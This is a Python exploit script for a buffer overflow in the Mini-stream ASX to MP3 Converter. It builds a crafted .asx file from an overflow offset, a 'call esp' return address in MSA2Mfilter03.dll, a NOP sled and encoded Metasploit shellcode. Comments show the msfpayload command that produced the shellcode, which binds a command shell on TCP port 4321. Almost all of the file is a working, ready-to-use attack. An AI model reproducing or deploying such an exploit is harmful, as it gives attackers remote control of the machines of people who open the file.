import struct

#crash at 26168 bytes
#buffer = "http://"+"A"*26168

# jmp esp or call esp in one of the converter modules.
#0x100371f5 : call esp |  {PAGE_EXECUTE_READ} [MSA2Mfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll)


# root@bt:~/lab-connection# msfpayload windows/shell_bind_tcp LPORT=4321 R| msfencode -b '\x00\x0A\x0D' -t c
# [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)


shellcode =("\xda\xd3\xd9\x74\x24\xf4\x5e\x29\xc9\xb8\xa2\xcb\x9a\x1f\xb1"
"\x56\x31\x46\x18\x03\x46\x18\x83\xee\x5e\x29\x6f\xe3\x76\x27"
"\x90\x1c\x86\x58\x18\xf9\xb7\x4a\x7e\x89\xe5\x5a\xf4\xdf\x05"
"\x10\x58\xf4\x9e\x54\x75\xfb\x17\xd2\xa3\x32\xa8\xd2\x6b\x98"
"\x6a\x74\x10\xe3\xbe\x56\x29\x2c\xb3\x97\x6e\x51\x3b\xc5\x27"
"\x1d\xe9\xfa\x4c\x63\x31\xfa\x82\xef\x09\x84\xa7\x30\xfd\x3e"
"\xa9\x60\xad\x35\xe1\x98\xc6\x12\xd2\x99\x0b\x41\x2e\xd3\x20"
"\xb2\xc4\xe2\xe0\x8a\x25\xd5\xcc\x41\x18\xd9\xc1\x98\x5c\xde"
"\x39\xef\x96\x1c\xc4\xe8\x6c\x5e\x12\x7c\x71\xf8\xd1\x26\x51"
"\xf8\x36\xb0\x12\xf6\xf3\xb6\x7d\x1b\x02\x1a\xf6\x27\x8f\x9d"
"\xd9\xa1\xcb\xb9\xfd\xea\x88\xa0\xa4\x56\x7f\xdc\xb7\x3f\x20"
"\x78\xb3\xd2\x35\xfa\x9e\xba\xfa\x31\x21\x3b\x94\x42\x52\x09"
"\x3b\xf9\xfc\x21\xb4\x27\xfa\x46\xef\x90\x94\xb8\x0f\xe1\xbd"
"\x7e\x5b\xb1\xd5\x57\xe3\x5a\x26\x57\x36\xcc\x76\xf7\xe8\xad"
"\x26\xb7\x58\x46\x2d\x38\x87\x76\x4e\x92\xbe\xb0\x80\xc6\x93"
"\x56\xe1\xf8\x34\xa3\x6c\x1e\x50\xbb\x38\x88\xcc\x79\x1f\x01"
"\x6b\x81\x75\x3d\x24\x15\xc1\x2b\xf2\x1a\xd2\x79\x51\xb6\x7a"
"\xea\x21\xd4\xbe\x0b\x36\xf1\x96\x42\x0f\x92\x6d\x3b\xc2\x02"
"\x71\x16\xb4\xa7\xe0\xfd\x44\xa1\x18\xaa\x13\xe6\xef\xa3\xf1"
"\x1a\x49\x1a\xe7\xe6\x0f\x65\xa3\x3c\xec\x68\x2a\xb0\x48\x4f"
"\x3c\x0c\x50\xcb\x68\xc0\x07\x85\xc6\xa6\xf1\x67\xb0\x70\xad"
"\x21\x54\x04\x9d\xf1\x22\x09\xc8\x87\xca\xb8\xa5\xd1\xf5\x75"
"\x22\xd6\x8e\x6b\xd2\x19\x45\x28\xe2\x53\xc7\x19\x6b\x3a\x92"
"\x1b\xf6\xbd\x49\x5f\x0f\x3e\x7b\x20\xf4\x5e\x0e\x25\xb0\xd8"
"\xe3\x57\xa9\x8c\x03\xcb\xca\x84")


ret= struct.pack('<L',0x100371f5)
nops ="\x90"*10
buffer = "http://"+"A"*17417+ret+ nops + shellcode+ "C"*(26168-4-17417-10-368)

try:
	fl = open("buffer.asx","w")
	fl.write(buffer)
	fl.close()
except:
	print "unable to write to file, file already in use ? "
